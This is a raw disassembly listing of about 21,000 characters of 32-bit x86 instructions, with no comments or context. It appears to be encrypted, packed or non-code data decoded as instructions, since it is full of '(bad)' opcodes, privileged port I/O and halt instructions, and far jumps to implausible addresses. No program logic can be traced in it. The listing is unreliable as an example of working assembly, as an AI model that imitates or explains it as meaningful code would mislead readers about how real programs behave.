  41e508:	mov    ebp,0x2da956c5
  41e50d:	mov    edi,0x34003c61
  41e512:	mov    esp,0x52e579bc
  41e517:	rcr    DWORD PTR [eax],cl
  41e519:	mov    bl,0x7a
  41e51b:	out    dx,al
  41e51c:	stc    
  41e51d:	fild   DWORD PTR [eax+0x11]
  41e520:	mov    dh,BYTE PTR [esi-0x6fca3f46]
  41e526:	and    eax,DWORD PTR [edx+0x1042ce32]
  41e52c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e52d:	fild   QWORD PTR [edx]
  41e52f:	imul   eax,DWORD PTR [esi+0xa],0xe9ac48f7
  41e536:	mov    DWORD PTR [edi],ecx
  41e538:	repnz cmp BYTE PTR [edi],dl
  41e53b:	(bad)  
  41e53c:	sti    
  41e53d:	adc    BYTE PTR [edx-0x65b1dca6],dh
  41e543:	jge    0x41e579
  41e545:	inc    ecx
  41e546:	mov    ah,0x86
  41e548:	push   ss
  41e549:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e54a:	cld    
  41e54b:	dec    ecx
  41e54c:	add    al,0x59
  41e54e:	jne    0x41e58a
  41e550:	enter  0x2b74,0x88
  41e554:	mov    dh,0xf6
  41e556:	jno    0x41e525
  41e558:	rcr    DWORD PTR [ebx+0x35],0x6f
  41e55c:	pop    ss
  41e55d:	xchg   edx,eax
  41e55e:	fstp   DWORD PTR [ebp+0x2792a8b4]
  41e564:	xor    eax,0xb1590b16
  41e569:	or     ebp,edi
  41e56b:	icebp  
  41e56c:	aaa    
  41e56d:	cmp    dh,BYTE PTR [ebp-0x15]
  41e570:	mov    ebp,0xc4293c2d
  41e575:	int    0xfd
  41e577:	rcl    DWORD PTR [ebx-0x4b],0x36
  41e57b:	mov    ah,0xa2
  41e57d:	lds    ebp,FWORD PTR [eax-0x7155b45c]
  41e583:	(bad)  [edi+0x77]
  41e586:	inc    esp
  41e587:	sbb    DWORD PTR [esp+ebp*1-0x5d922212],esi
  41e58e:	jne    0x41e5aa
  41e590:	aas    
  41e591:	in     eax,dx
  41e592:	inc    ebp
  41e593:	inc    edx
  41e594:	lea    ebx,[edi+0x4c]
  41e597:	jl     0x41e59d
  41e599:	mov    al,0xc
  41e59b:	dec    ebp
  41e59c:	mov    edi,0xb895d6e1
  41e5a1:	xchg   edx,eax
  41e5a2:	fbld   TBYTE PTR ds:0x3b4e7ed9
  41e5a8:	sub    eax,eax
  41e5aa:	dec    edi
  41e5ab:	or     eax,0xae69fa66
  41e5b0:	out    0x7d,al
  41e5b2:	mov    WORD PTR [edx-0x51f252a8],?
  41e5b8:	adc    ebp,DWORD PTR [ecx]
  41e5ba:	jle    0x41e578
  41e5bc:	mov    ebp,DWORD PTR [ebp+0x38]
  41e5bf:	inc    ebx
  41e5c0:	fld    TBYTE PTR [edx]
  41e5c2:	repz dec ebx
  41e5c4:	sbb    ebx,DWORD PTR [edx-0x3d]
  41e5c7:	push   ecx
  41e5c8:	loope  0x41e593
  41e5ca:	test   al,0x39
  41e5cc:	or     BYTE PTR [ebx-0x62],ah
  41e5cf:	lock daa 
  41e5d1:	mov    DWORD PTR [eax+0x3c4fbfe0],ecx
  41e5d7:	fldcw  WORD PTR [ebx]
  41e5d9:	sti    
  41e5da:	in     eax,dx
  41e5db:	popa   
  41e5dc:	test   DWORD PTR [esi+0x1fc775b2],esp
  41e5e2:	mov    WORD PTR [ebx],fs
  41e5e4:	mov    dl,cl
  41e5e6:	mov    dl,0x21
  41e5e8:	ja     0x41e60c
  41e5ea:	shl    BYTE PTR [ecx],cl
  41e5ec:	or     DWORD PTR [ecx],esp
  41e5ee:	mov    BYTE PTR [ebx+ebx*4],bh
  41e5f1:	das    
  41e5f2:	xchg   ecx,eax
  41e5f3:	icebp  
  41e5f4:	mov    ds:0x61650a0d,al
  41e5f9:	dec    esp
  41e5fa:	push   esp
  41e5fb:	repz adc al,0x40
  41e5fe:	xor    BYTE PTR [edi],al
  41e600:	sub    eax,0xf2fe53ad
  41e605:	cmp    eax,0x59e89d52
  41e60a:	mov    cl,BYTE PTR fs:[esi]
  41e60d:	ds jmp 0xa394f888
  41e613:	lds    ebp,FWORD PTR cs:[ebp+0x588926bf]
  41e61a:	pop    es
  41e61b:	out    0xc3,eax
  41e61d:	retf   0x4962
  41e620:	outs   dx,BYTE PTR ds:[esi]
  41e621:	push   edx
  41e622:	add    esp,DWORD PTR [ebp-0x6cffc2b3]
  41e628:	mov    al,ds:0xe65c5e2c
  41e62d:	(bad)  
  41e62f:	rcl    ebp,1
  41e631:	or     al,BYTE PTR [edi+ecx*2-0x16b33a41]
  41e638:	sti    
  41e639:	xlat   BYTE PTR ds:[ebx]
  41e63a:	xchg   BYTE PTR [ecx],cl
  41e63c:	inc    esi
  41e63d:	inc    edx
  41e63e:	aad    0x80
  41e640:	je     0x41e63a
  41e642:	and    BYTE PTR [ecx+0x6e],ah
  41e645:	out    dx,eax
  41e646:	ror    DWORD PTR [ecx],1
  41e648:	or     dl,BYTE PTR [edx+eiz*1]
  41e64b:	inc    esi
  41e64c:	scas   al,BYTE PTR es:[edi]
  41e64d:	inc    ebp
  41e64e:	adc    esi,ecx
  41e650:	sub    esp,eax
  41e652:	not    BYTE PTR [ecx+eax*2]
  41e655:	sbb    al,0x47
  41e657:	bound  ecx,QWORD PTR [ebp-0x4f6c4ce2]
  41e65d:	cmp    ah,BYTE PTR [edi-0x3]
  41e660:	cmp    DWORD PTR [esi-0x1ed4c103],0x9a878822
  41e66a:	jmp    0x1d6c52ae
  41e66f:	in     al,dx
  41e670:	and    ecx,DWORD PTR ds:0x94ec955
  41e676:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e677:	jg     0x41e656
  41e679:	ror    BYTE PTR [eax+0x38],1
  41e67c:	xor    bh,ch
  41e67e:	xor    ch,al
  41e680:	xor    eax,0x43422496
  41e685:	sti    
  41e686:	jae    0x41e62b
  41e688:	push   0x7
  41e68a:	mov    bh,0x2d
  41e68c:	inc    ecx
  41e68d:	adc    DWORD PTR [ecx+0x6c],edi
  41e690:	test   bl,bl
  41e692:	cmp    ah,0x67
  41e695:	dec    ecx
  41e696:	xor    al,BYTE PTR [ebx]
  41e698:	or     DWORD PTR [esi+0x6180c583],eax
  41e69e:	fcmovbe st,st(1)
  41e6a0:	xchg   esp,eax
  41e6a1:	push   ecx
  41e6a2:	mov    edi,0xa5fec083
  41e6a7:	lea    ecx,[ecx+0x758166c]
  41e6ad:	(bad)  
  41e6ae:	mov    edi,0xdffb2e5f
  41e6b3:	test   al,0x4c
  41e6b5:	jne    0x41e717
  41e6b7:	sbb    BYTE PTR [edx-0x19e57000],dh
  41e6bd:	inc    edi
  41e6be:	aad    0x54
  41e6c0:	sbb    eax,0x50c719f
  41e6c5:	add    dl,BYTE PTR [esi+0xb802458]
  41e6cb:	mov    ds:0x221ede9,eax
  41e6d0:	aam    0x1b
  41e6d2:	nop
  41e6d3:	out    0x9e,al
  41e6d5:	aas    
  41e6d6:	test   BYTE PTR [ecx+0x32b900f6],bh
  41e6dc:	xchg   esp,eax
  41e6dd:	mov    bl,0x85
  41e6df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e6e0:	pop    edi
  41e6e1:	sbb    BYTE PTR [edx],al
  41e6e3:	push   ds
  41e6e4:	fimul  DWORD PTR [ebx-0x706deb60]
  41e6ea:	or     cl,cl
  41e6ec:	sahf   
  41e6ed:	pop    ebx
  41e6ee:	jns    0x41e6ed
  41e6f0:	repz cli 
  41e6f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e6f3:	aaa    
  41e6f4:	sub    BYTE PTR [ebp-0x5d],cl
  41e6f7:	sub    eax,0x32bac9ce
  41e6fc:	leave  
  41e6fd:	mov    eax,0xabec8d1c
  41e702:	push   es
  41e703:	and    bh,BYTE PTR [ecx+0x1e]
  41e706:	add    eax,0xa2609dbc
  41e70b:	cmp    eax,ebp
  41e70d:	not    BYTE PTR [ebp-0x34]
  41e710:	popf   
  41e711:	pop    eax
  41e712:	sbb    esp,eax
  41e714:	mov    dl,0x30
  41e716:	cmp    edx,DWORD PTR [edx+eiz*8+0xc7ae18c]
  41e71d:	mov    WORD PTR [eax-0x1d0890c],?
  41e723:	push   ecx
  41e724:	sbb    edi,edi
  41e726:	mov    edi,0xd76e3ee9
  41e72b:	aad    0xd5
  41e72d:	xchg   bl,bh
  41e72f:	push   esi
  41e730:	mov    ah,0x55
  41e732:	pop    ecx
  41e733:	(bad)  
  41e734:	frstor [eax+0x464d5b49]
  41e73a:	ficomp WORD PTR [ebp-0x20]
  41e73d:	loope  0x41e723
  41e73f:	pusha  
  41e740:	push   ebx
  41e741:	push   edi
  41e742:	xchg   ecx,eax
  41e743:	xchg   edi,eax
  41e744:	hlt    
  41e745:	fdivr  DWORD PTR [esi]
  41e747:	ret    0x2f03
  41e74a:	xchg   edx,eax
  41e74b:	cs test al,0x1b
  41e74e:	ds je  0x41e78b
  41e751:	sub    edx,DWORD PTR ds:0x3c193a93
  41e757:	adc    DWORD PTR [esi+0x24],eax
  41e75a:	cmp    cl,dh
  41e75c:	add    dl,ch
  41e75e:	pop    eax
  41e75f:	mov    dh,0x22
  41e761:	rcl    bh,cl
  41e763:	mov    dl,0x1b
  41e765:	push   esp
  41e766:	cmc    
  41e767:	pop    es
  41e768:	xlat   BYTE PTR ds:[ebx]
  41e769:	xchg   ebx,eax
  41e76a:	mov    ebp,DWORD PTR [ecx]
  41e76c:	lahf   
  41e76d:	(bad)  
  41e76f:	and    BYTE PTR [ebp-0x675f9464],cl
  41e775:	cwde   
  41e776:	lods   eax,DWORD PTR ds:[esi]
  41e777:	adc    BYTE PTR [ebx+0x10e546b2],al
  41e77d:	std    
  41e77e:	ja     0x41e7dd
  41e780:	jbe    0x41e7eb
  41e782:	mov    ebp,0x7ed44c55
  41e787:	jmp    0x41e7bc
  41e789:	pusha  
  41e78a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e78b:	sbb    al,ch
  41e78d:	inc    edi
  41e78e:	mov    esp,0x323405c7
  41e793:	ror    edx,cl
  41e795:	in     al,dx
  41e796:	mov    ebx,DWORD PTR [edi]
  41e798:	push   0x3d4cff67
  41e79d:	or     al,0xa7
  41e79f:	div    DWORD PTR [ecx-0x22]
  41e7a2:	mov    ds:0xef09b7ec,eax
  41e7a7:	mov    ah,0xf3
  41e7a9:	xchg   esp,eax
  41e7aa:	hlt    
  41e7ab:	dec    ecx
  41e7ac:	and    esp,DWORD PTR [ebp+0x5c258ecc]
  41e7b2:	test   DWORD PTR [ecx+ebp*1-0x2a2e422c],ebx
  41e7b9:	mov    cl,0xda
  41e7bb:	xor    al,0x26
  41e7bd:	mov    ds:0x3833e5ad,al
  41e7c2:	cli    
  41e7c3:	ja     0x41e7f7
  41e7c5:	mov    eax,0x822b7dc6
  41e7ca:	leave  
  41e7cb:	pop    ss
  41e7cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e7cd:	fcom   DWORD PTR [edx]
  41e7cf:	xor    esp,DWORD PTR [edi]
  41e7d1:	jmp    0xae4e9d00
  41e7d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e7d7:	enter  0xeef0,0x2e
  41e7db:	bound  edi,QWORD PTR [eax]
  41e7dd:	adc    DWORD PTR [ebx+0x63],esp
  41e7e0:	adc    al,0xae
  41e7e2:	les    edi,FWORD PTR [eax+edi*8+0x5aca0208]
  41e7e9:	adc    BYTE PTR [ecx+0x61c3a11d],dl
  41e7ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e7f0:	(bad)  
  41e7f1:	pop    ds
  41e7f2:	xchg   esi,eax
  41e7f3:	pop    ebx
  41e7f4:	pushw  ss
  41e7f6:	xchg   ecx,eax
  41e7f7:	push   0xffffff88
  41e7f9:	jo     0x41e7bc
  41e7fb:	sub    BYTE PTR [ebx+ebp*1],0xf
  41e7ff:	jl     0x41e7c5
  41e801:	es mov edx,0x65895c18
  41e807:	js     0x41e80d
  41e809:	xchg   BYTE PTR [ecx+ebx*2],dl
  41e80c:	scas   al,BYTE PTR es:[edi]
  41e80d:	dec    ebx
  41e80e:	push   es
  41e80f:	jge    0x41e7f4
  41e811:	(bad)  
  41e812:	xor    eax,0x76ac1142
  41e817:	test   ecx,eax
  41e819:	jne    0x41e849
  41e81b:	mov    al,ds:0xe28203e
  41e820:	push   ss
  41e821:	aam    0xe1
  41e823:	jecxz  0x41e85b
  41e825:	popa   
  41e826:	out    0xe2,al
  41e828:	add    DWORD PTR [eax],0x9
  41e82b:	enter  0xb484,0x84
  41e82f:	add    dh,BYTE PTR [eax+0x6ed21c3]
  41e835:	pushf  
  41e836:	repnz out 0x9b,eax
  41e839:	lahf   
  41e83a:	push   ebp
  41e83b:	jmp    0xdfb5:0x32e65e3c
  41e842:	mov    ah,0x55
  41e844:	dec    eax
  41e845:	pop    ebp
  41e846:	imul   edi,DWORD PTR [esi],0xffffff99
  41e849:	xor    eax,0xf276f86d
  41e84e:	sub    al,0x13
  41e850:	and    esi,ecx
  41e852:	jno    0x41e877
  41e854:	jbe    0x41e82f
  41e856:	mov    bl,0x64
  41e858:	ds iret 
  41e85a:	into   
  41e85b:	jns    0x41e7f8
  41e85d:	mov    dh,0xc9
  41e85f:	sub    BYTE PTR [esi-0x67cd52a6],0x98
  41e866:	push   esi
  41e867:	and    eax,0x6ac1fdd7
  41e86c:	arpl   bp,di
  41e86e:	and    al,BYTE PTR [edx+0x4c]
  41e871:	jp     0x41e83c
  41e873:	mov    dl,0x12
  41e875:	xor    dl,bl
  41e877:	sbb    eax,0x5cfaddfa
  41e87c:	(bad)  
  41e87d:	adc    al,0x95
  41e87f:	mov    ecx,DWORD PTR [edx+0x1b]
  41e882:	(bad)  
  41e883:	xchg   ebx,eax
  41e884:	mov    ah,0xa4
  41e886:	cmp    BYTE PTR [eax],dl
  41e888:	and    ah,BYTE PTR [eax+0xd6de9dd]
  41e88e:	mov    ss,WORD PTR [edx-0x542c1b03]
  41e894:	jg     0x41e87b
  41e896:	ret    
  41e897:	xchg   ebp,eax
  41e898:	cli    
  41e899:	adc    ebx,ebp
  41e89b:	dec    esp
  41e89c:	test   DWORD PTR [edi-0xc83d144],0x5fb09964
  41e8a6:	and    cl,al
  41e8a8:	adc    edx,DWORD PTR [edi+0x43]
  41e8ab:	sub    bh,BYTE PTR [edx-0x7e068563]
  41e8b1:	dec    edi
  41e8b2:	pop    eax
  41e8b3:	sub    eax,0x65757a02
  41e8b8:	and    al,0x9
  41e8ba:	imul   edx,DWORD PTR [esi],0xffffffdf
  41e8bd:	test   al,0x3e
  41e8bf:	fucom  st(2)
  41e8c1:	inc    ebp
  41e8c2:	add    bl,BYTE PTR [eax+0x7a]
  41e8c5:	sbb    al,0xbe
  41e8c7:	and    ah,BYTE PTR [ebx+esi*4-0x35d77ab0]
  41e8ce:	pop    ss
  41e8cf:	add    ah,ah
  41e8d1:	adc    dh,cl
  41e8d3:	fcmovbe st,st(2)
  41e8d5:	mov    ebx,0xd41ab77d
  41e8da:	std    
  41e8db:	adc    al,dl
  41e8dd:	lods   al,BYTE PTR ds:[esi]
  41e8de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e8df:	mov    dh,0x60
  41e8e1:	dec    eax
  41e8e2:	adc    eax,0x166f0d57
  41e8e7:	imul   ebx,edi,0xffffffa7
  41e8ea:	cmp    DWORD PTR [edx],ebx
  41e8ec:	clc    
  41e8ed:	jg     0x41e889
  41e8ef:	ret    
  41e8f0:	pop    ss
  41e8f1:	gs stos DWORD PTR es:[edi],eax
  41e8f3:	leave  
  41e8f4:	into   
  41e8f5:	push   edx
  41e8f6:	cmc    
  41e8f7:	cmp    DWORD PTR [ebp+0x1d],ebx
  41e8fa:	repz mov edi,0xe2f4b06e
  41e900:	xor    DWORD PTR [ecx-0x2071bdaa],ebx
  41e906:	retf   
  41e907:	mov    ecx,0x8cfb98ed
  41e90c:	out    dx,al
  41e90d:	mov    esp,0x1fc0ddba
  41e912:	pop    es
  41e913:	repnz and al,0xe7
  41e916:	(bad)  
  41e917:	std    
  41e918:	dec    edx
  41e919:	cmc    
  41e91a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e91b:	pop    es
  41e91c:	xor    esp,0x59884a72
  41e922:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e923:	loop   0x41e968
  41e925:	out    dx,eax
  41e926:	inc    edi
  41e927:	fsub   st,st(0)
  41e929:	in     al,dx
  41e92a:	dec    esp
  41e92b:	mov    eax,0xc6d64262
  41e930:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e931:	push   es
  41e932:	sub    eax,0xeb4aed
  41e937:	mov    al,ds:0xaa67b41c
  41e93c:	xchg   BYTE PTR [edi],dl
  41e93e:	sahf   
  41e93f:	shr    DWORD PTR [edi],0xea
  41e942:	and    BYTE PTR [eax+0x2e],ch
  41e945:	mov    ah,0xdf
  41e947:	out    0x52,al
  41e949:	retf   
  41e94a:	aad    0x97
  41e94c:	test   BYTE PTR [ebp-0x22729a9c],al
  41e952:	push   ebx
  41e953:	xchg   BYTE PTR [ebp-0x1fa84383],dl
  41e959:	ror    DWORD PTR [edi-0x1cc607d],0x7
  41e960:	call   0x9047:0xd9c6055c
  41e967:	add    al,0x79
  41e969:	pop    edi
  41e96a:	sub    al,BYTE PTR [esi+0x3969a4f0]
  41e970:	js     0x41e98b
  41e972:	pop    eax
  41e973:	xor    eax,0x83a7e3f8
  41e978:	xchg   edi,eax
  41e979:	and    eax,0x6cd1e5c7
  41e97e:	es ret 0x2e08
  41e982:	stos   DWORD PTR es:[edi],eax
  41e983:	gs and al,0x1b
  41e986:	shl    BYTE PTR [esp+esi*2-0x63],0xa1
  41e98b:	das    
  41e98c:	xor    al,0x51
  41e98e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e98f:	lea    eax,[ebx]
  41e991:	in     eax,dx
  41e992:	sbb    BYTE PTR [edx],bh
  41e994:	mov    edx,0xab8d0f9b
  41e999:	mov    ah,BYTE PTR [esi+0x17]
  41e99c:	lea    edi,[esi+0x4f0fc38a]
  41e9a2:	fxch   st(6)
  41e9a4:	mul    esi
  41e9a6:	cmp    BYTE PTR [edi],dh
  41e9a8:	jmp    0x2d3f:0x73393d43
  41e9af:	adc    al,0x4e
  41e9b2:	adc    BYTE PTR [edx+0x4a9963a5],bh
  41e9b8:	mov    dl,0x26
  41e9ba:	push   ebx
  41e9bb:	cmp    al,BYTE PTR [edi+0x6]
  41e9be:	int3   
  41e9bf:	xchg   esi,eax
  41e9c0:	inc    eax
  41e9c1:	pop    esi
  41e9c2:	and    cl,cl
  41e9c4:	adc    ch,BYTE PTR [eax+0x3cf370f0]
  41e9ca:	test   al,0x82
  41e9cc:	cs ja  0x41e954
  41e9cf:	adc    DWORD PTR [edi-0x32],edx
  41e9d2:	test   ah,dh
  41e9d4:	ins    DWORD PTR es:[edi],dx
  41e9d5:	mov    ds:0x3ab110ae,eax
  41e9da:	cmp    BYTE PTR [edi-0x2e],ah
  41e9dd:	xor    DWORD PTR [edx+edx*2],edi
  41e9e0:	mov    bh,0x7
  41e9e2:	scas   al,BYTE PTR es:[edi]
  41e9e3:	xor    ecx,DWORD PTR [edi+0x646ac031]
  41e9e9:	pusha  
  41e9ea:	or     ah,BYTE PTR [esi+ebx*1-0x12]
  41e9ee:	loopne 0x41ea0b
  41e9f0:	jbe    0x41ea32
  41e9f2:	add    ch,cl
  41e9f4:	fwait
  41e9f5:	ins    DWORD PTR es:[edi],dx
  41e9f6:	xor    bl,cl
  41e9f8:	dec    ecx
  41e9f9:	leave  
  41e9fa:	mov    ds:0x35ec7c25,eax
  41e9ff:	mov    bl,0x64
  41ea01:	jno    0x41ea57
  41ea03:	enter  0x3f2c,0xf7
  41ea07:	dec    esi
  41ea08:	adc    al,0x8
  41ea0a:	stos   BYTE PTR es:[edi],al
  41ea0b:	pop    eax
  41ea0c:	push   eax
  41ea0d:	ja     0x41ea68
  41ea0f:	pop    eax
  41ea10:	push   ebx
  41ea11:	adc    DWORD PTR [esi+0x386253d],esi
  41ea17:	(bad)  
  41ea18:	xor    DWORD PTR [esi-0x2fa6cde3],esp
  41ea1e:	xchg   DWORD PTR [eax-0xc45b9b9],esi
  41ea24:	out    0xf0,eax
  41ea26:	fmul   st,st(1)
  41ea28:	push   esi
  41ea29:	fsub   DWORD PTR [edi]
  41ea2b:	lahf   
  41ea2c:	add    ecx,0x8c60d64c
  41ea32:	dec    eax
  41ea33:	hlt    
  41ea34:	inc    esp
  41ea35:	mov    cl,0xc
  41ea37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ea38:	(bad)  
  41ea39:	push   edx
  41ea3a:	retf   0xe953
  41ea3d:	stos   DWORD PTR es:[edi],eax
  41ea3e:	call   0x4d6c87aa
  41ea43:	iret   
  41ea44:	ss (bad) 
  41ea46:	rcr    BYTE PTR [eax+0x67],cl
  41ea49:	xor    edi,eax
  41ea4b:	inc    ebp
  41ea4c:	inc    edx
  41ea4d:	dec    ecx
  41ea4e:	sahf   
  41ea4f:	nop    DWORD PTR [ebx-0x69]
  41ea53:	jns    0x41ea62
  41ea55:	pop    eax
  41ea56:	and    DWORD PTR [eax+0x55090fa1],edi
  41ea5c:	jmp    0xb613687
  41ea61:	call   0x5873:0x3291e88
  41ea68:	mov    eax,0xd0d5ba7f
  41ea6d:	inc    eax
  41ea6e:	xor    BYTE PTR [ebp+0x77ac0dab],bh
  41ea74:	jae    0x41eaf5
  41ea76:	test   BYTE PTR [edx-0x1f],dh
  41ea79:	rol    BYTE PTR [esi],0x70
  41ea7c:	inc    ecx
  41ea7d:	push   edx
  41ea7e:	pop    ds
  41ea7f:	(bad)  
  41ea81:	retf   
  41ea82:	inc    ecx
  41ea83:	nop
  41ea84:	shl    esi,1
  41ea86:	aas    
  41ea87:	inc    edx
  41ea88:	test   dl,dh
  41ea8a:	add    al,0x8a
  41ea8c:	mov    bl,0xba
  41ea8e:	mov    edx,0x3b50b92a
  41ea93:	dec    ebx
  41ea94:	out    0xa8,eax
  41ea96:	in     al,dx
  41ea97:	sbb    ebx,DWORD PTR [ebx-0x6]
  41ea9a:	(bad)
  41ea9d:	sbb    edx,DWORD PTR [edx]
  41ea9f:	hlt    
  41eaa0:	sub    eax,0xa077551c
  41eaa5:	mov    al,0x1b
  41eaa7:	stos   DWORD PTR es:[edi],eax
  41eaa8:	jae    0x41ea3c
  41eaaa:	retf   0x741d
  41eaad:	cli    
  41eaae:	aam    0x61
  41eab0:	inc    esi
  41eab1:	xchg   edi,eax
  41eab2:	sbb    DWORD PTR [ecx+edx*4-0x4dcae32d],esi
  41eab9:	mov    al,cs:0xc7294901
  41eabf:	xor    BYTE PTR [ebx-0x2d],al
  41eac2:	(bad)  
  41eac3:	and    eax,0x50a886cd
  41eac8:	enter  0xb79,0x1f
  41eacc:	movzx  edx,WORD PTR [ecx]
  41eacf:	sub    BYTE PTR [eax+0x67],ch
  41ead2:	lahf   
  41ead3:	add    cl,BYTE PTR [esp+esi*1+0x5a]
  41ead7:	add    ch,al
  41ead9:	lods   al,BYTE PTR ds:[esi]
  41eada:	xor    ah,BYTE PTR [esi]
  41eadc:	sahf   
  41eadd:	pushf  
  41eade:	mov    ebx,0x90b2999a
  41eae3:	mov    eax,0x11d18491
  41eae8:	adc    DWORD PTR ds:0xb9627632,0x62cb81b4
  41eaf2:	jo     0x41eb09
  41eaf4:	call   0xf122:0x4541a9a7
  41eafb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eafc:	mov    eax,ds:0x4bc52953
  41eb01:	push   edx
  41eb02:	bnd ret 
  41eb04:	popf   
  41eb05:	and    al,0x90
  41eb07:	retf   
  41eb08:	imul   ebx,DWORD PTR [ecx+0x7c],0xe
  41eb0c:	sub    BYTE PTR [edi-0x55],0x86
  41eb10:	mov    edi,0x3bbc2c4e
  41eb15:	adc    BYTE PTR [esi-0x57892c9f],dh
  41eb1b:	sbb    eax,0xefc7cc13
  41eb20:	jno    0x41eb6d
  41eb22:	test   BYTE PTR [ebp-0x26],bh
  41eb25:	iret   
  41eb26:	ins    DWORD PTR es:[edi],dx
  41eb27:	ret    0xa3f8
  41eb2a:	and    BYTE PTR [esi+0x3da1a12],bh
  41eb30:	sub    eax,0xc454fd1
  41eb35:	xor    al,0x0
  41eb37:	icebp  
  41eb38:	addr16 push esp
  41eb3a:	sbb    BYTE PTR [edx],ah
  41eb3c:	das    
  41eb3d:	inc    eax
  41eb3e:	pop    eax
  41eb3f:	inc    ecx
  41eb40:	call   0xba0c9892
  41eb45:	sbb    ebx,DWORD PTR [ebp-0x1]
  41eb48:	int    0xeb
  41eb4a:	xchg   DWORD PTR [edi-0x5d],esp
  41eb4d:	push   ds
  41eb4e:	jl     0x41eaf8
  41eb50:	dec    eax
  41eb51:	sbb    eax,0x712b53df
  41eb56:	or     ebp,esi
  41eb58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eb59:	and    BYTE PTR [edx],bh
  41eb5b:	mov    ah,BYTE PTR [esi+0xcf5a47f]
  41eb61:	out    0x31,al
  41eb63:	jecxz  0x41ebc7
  41eb65:	xchg   ecx,eax
  41eb66:	jae    0x41eb32
  41eb68:	add    DWORD PTR [esi-0x5b],esi
  41eb6b:	(bad)  
  41eb6c:	mov    edx,DWORD PTR [edx+0x34a1ad1d]
  41eb72:	and    eax,0x2dded85b
  41eb77:	shl    DWORD PTR [ebx-0x7f],cl
  41eb7a:	cmp    DWORD PTR [edx-0x5d],0x3f
  41eb7e:	ret    
  41eb7f:	leave  
  41eb80:	xor    al,0x17
  41eb82:	or     DWORD PTR [ebx-0x3c],eax
  41eb85:	inc    ebx
  41eb86:	or     BYTE PTR [edi+0x40c50e8a],al
  41eb8c:	xchg   edx,eax
  41eb8d:	push   edi
  41eb8e:	sti    
  41eb8f:	repnz inc edx
  41eb91:	push   eax
  41eb92:	mov    bh,0x9c
  41eb94:	xchg   edx,ecx
  41eb96:	jmp    0x103ff227
  41eb9b:	je     0x41eb40
  41eb9d:	ins    BYTE PTR es:[edi],dx
  41eb9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eb9f:	mov    dl,0x11
  41eba1:	sub    DWORD PTR [ebp+eiz*4-0x6f671532],ebp
  41eba8:	cdq    
  41eba9:	or     al,0xc3
  41ebab:	inc    edi
  41ebac:	jae    0x41eb60
  41ebae:	mov    cl,0x25
  41ebb0:	rcr    DWORD PTR [ebx+0x63b6667a],cl
  41ebb6:	add    al,0x48
  41ebb8:	push   0x69125278
  41ebbd:	fs into 
  41ebbf:	cmp    DWORD PTR [edi+0x8],ebp
  41ebc2:	xor    BYTE PTR [esp+esi*8],dl
  41ebc5:	and    dh,ah
  41ebc7:	movhps xmm1,QWORD PTR [edi-0x61de0feb]
  41ebce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ebcf:	mov    ebx,eax
  41ebd1:	xor    ecx,DWORD PTR [edx+0x11b7cfe3]
  41ebd7:	cmp    eax,0x955b1080
  41ebdc:	adc    DWORD PTR [ecx+0x188cc16],esi
  41ebe2:	(bad)  
  41ebe3:	rcr    DWORD PTR [eax-0x2b98670b],1
  41ebe9:	scas   al,BYTE PTR es:[edi]
  41ebea:	push   edi
  41ebeb:	jne    0x41ec60
  41ebed:	nop
  41ebee:	inc    esi
  41ebef:	scas   al,BYTE PTR es:[edi]
  41ebf0:	adc    eax,0x53667f9b
  41ebf5:	jne    0x41ec08
  41ebf7:	or     al,0xb7
  41ebf9:	push   cs
  41ebfa:	test   edi,0xa8628f36
  41ec00:	and    DWORD PTR [ecx],eax
  41ec02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ec03:	aad    0xe0
  41ec05:	loopne 0x41ec2e
  41ec07:	inc    BYTE PTR [esi-0x6072ea24]
  41ec0d:	icebp  
  41ec0e:	mov    ecx,cs
  41ec10:	adc    esi,DWORD PTR [ebx-0x19]
  41ec13:	rcr    BYTE PTR [esi-0x78],1
  41ec16:	in     al,0xd6
  41ec18:	push   esp
  41ec19:	xchg   al,dh
  41ec1b:	scas   al,BYTE PTR es:[edi]
  41ec1c:	adc    BYTE PTR ds:0x9b30fa11,cl
  41ec22:	hlt    
  41ec23:	hlt    
  41ec24:	mov    ds:0xc879674b,al
  41ec29:	xchg   ebp,eax
  41ec2a:	aad    0x39
  41ec2c:	in     al,dx
  41ec2d:	ret    0x947f
  41ec30:	cmp    ebx,edx
  41ec32:	xor    al,cl
  41ec34:	in     al,0x6a
  41ec36:	cld    
  41ec37:	mov    edx,0xad06c054
  41ec3c:	test   DWORD PTR [ecx+0x5e8c1ee7],eax
  41ec42:	iret   
  41ec43:	push   0xdd9cdebd
  41ec48:	jge    0x41ec80
  41ec4a:	inc    ebp
  41ec4b:	in     eax,0xcf
  41ec4d:	sub    al,0xa2
  41ec4f:	xchg   ebx,eax
  41ec50:	pop    ecx
  41ec51:	mov    esi,0xffcba26f
  41ec56:	cli    
  41ec57:	inc    ebp
  41ec58:	ds scas eax,DWORD PTR es:[edi]
  41ec5a:	pushf  
  41ec5b:	or     edi,DWORD PTR [ebx+0x1c]
  41ec5e:	imul   ebp,esi,0xffffff8d
  41ec61:	jb     0x41eca4
  41ec63:	pop    ebp
  41ec64:	inc    edx
  41ec65:	mov    esp,0xded57f87
  41ec6a:	sbb    al,0x71
  41ec6c:	adc    al,0x94
  41ec6e:	je     0x41ec89
  41ec70:	sbb    al,0x5e
  41ec72:	push   esp
  41ec73:	pushf  
  41ec74:	sti    
